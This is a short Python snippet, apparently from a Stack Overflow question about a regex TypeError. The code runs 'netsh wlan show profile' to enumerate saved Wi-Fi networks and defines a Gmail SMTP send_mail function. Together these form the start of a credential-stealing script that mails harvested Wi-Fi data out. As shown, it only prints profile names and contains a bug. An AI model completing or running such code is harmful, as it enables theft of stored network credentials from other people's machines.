#Source: https://stackoverflow.com/questions/67065998/typeerror-cannot-use-a-string-pattern-on-a-bytes-like-object-regex-not-getting
def send_mail(email, password, message):
 server = smtplib.SMTP("smtp.gmail.com", 587)
 server.starttls()
 server.login(email, password)
 server.sendmail(email, email, message)
 server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names = re.search(":Profile\s*:\s(.*)", networks )

print(network_names.group(0))